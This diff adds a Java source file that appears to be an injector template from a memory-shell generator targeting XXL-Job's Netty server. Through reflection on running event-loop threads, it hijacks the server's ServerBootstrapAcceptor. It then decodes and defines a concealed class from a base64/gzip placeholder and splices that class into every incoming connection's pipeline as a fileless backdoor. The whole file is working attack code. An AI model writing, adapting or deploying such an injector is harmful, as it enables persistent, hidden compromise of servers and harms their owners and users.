@@ -1,0 +1,211 @@
+package org.leo.jmg.mem.injectortpl.xxljob;
+
+import io.netty.channel.ChannelHandler;
+import io.netty.channel.ChannelInitializer;
+import io.netty.channel.socket.SocketChannel;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.PrintStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Set;
+import java.util.UUID;
+import java.util.zip.GZIPInputStream;
+
+/**
+ * @since 2025/1/21
+ */
+public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel> {
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
+    public XxlJobNettyHandlerInjector() {
+        if (ok) {
+            return;
+        }
+        try {
+            if (inject()) {
+                msg += "[/*] ready\n";
+            } else {
+                msg += "failed, server channel not found\n";
+            }
+        } catch (Throwable e) {
+            msg += "failed " + getErrorMessage(e) + "\n";
+        }
+        ok = true;
+        System.out.println(msg);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
+    }
+
+    private static Class<?> handlerClass;
+    private static ChannelHandler originalChildHandler;
+    private final String handlerName = UUID.randomUUID().toString();
+
+    @Override
+    protected void initChannel(SocketChannel channel) throws Exception {
+        if (channel.pipeline().get(handlerName) != null) {
+            return;
+        }
+        ChannelHandler channelHandler = (ChannelHandler) handlerClass.newInstance();
+        channel.pipeline().addLast(originalChildHandler);
+        String httpCodecName = null;
+        for (String name : channel.pipeline().names()) {
+            if (name.contains("HttpObjectAggregator")) {
+                httpCodecName = name;
+                break;
+            }
+        }
+        if (httpCodecName != null) {
+            channel.pipeline().addAfter(httpCodecName, handlerName, channelHandler);
+        } else {
+            channel.pipeline().addFirst(handlerName, channelHandler);
+        }
+    }
+
+    private Class<?> getShellClass(Object context) throws Exception {
+        ClassLoader classLoader = context.getClass().getClassLoader();
+        try {
+            return classLoader.loadClass(getClassName());
+        } catch (Exception e) {
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            return (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+        }
+    }
+
+    public boolean inject() throws Exception {
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
+        for (Thread thread : threads) {
+            if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
+                Object target;
+                try {
+                    Object innerRunnable = getFieldValue(getFieldValue(thread, "target"), "runnable");
+                    Field evField = getField(innerRunnable.getClass(), "val$eventExecutor");
+                    if (evField == null) {
+                        evField = getField(innerRunnable.getClass(), "this$0");
+                    }
+                    if (evField == null) {
+                        continue;
+                    }
+                    target = evField.get(innerRunnable);
+                    if (target.getClass().getName().endsWith("NioEventLoop")) {
+                        Set<?> set = (Set<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
+                        for (Object key : set.toArray()) {
+                            try {
+                                Object pipeline = getFieldValue(((java.nio.channels.SelectionKey) key).attachment(), "pipeline");
+                                Object tail = getFieldValue(pipeline, "tail");
+                                Object prevContext = getFieldValue(tail, "prev");
+                                Object acceptor = getFieldValue(prevContext, "handler");
+                                if (acceptor == null || !acceptor.getClass().getName().contains("ServerBootstrapAcceptor")) {
+                                    continue;
+                                }
+                                Field childHandlerField = getField(acceptor.getClass(), "childHandler");
+                                if (childHandlerField == null) {
+                                    continue;
+                                }
+                                childHandlerField.setAccessible(true);
+                                originalChildHandler = (ChannelHandler) childHandlerField.get(acceptor);
+                                handlerClass = getShellClass(acceptor);
+                                childHandlerField.set(acceptor, this);
+                                return true;
+                            } catch (Exception ignored) {
+                            }
+                        }
+                    }
+                } catch (Exception ignored) {
+                }
+            }
+        }
+        return false;
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+        } finally {
+            if (gzipInputStream != null) {
+                try {
+                    gzipInputStream.close();
+                } catch (IOException ignored) {
+                }
+            }
+            out.close();
+        }
+        return out.toByteArray();
+    }
+
+    public Field getField(final Class<?> clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        } catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null) {
+                field = getField(clazz.getSuperclass(), fieldName);
+            }
+        }
+        return field;
+    }
+
+    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        return field.get(obj);
+    }
+
+    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
+}
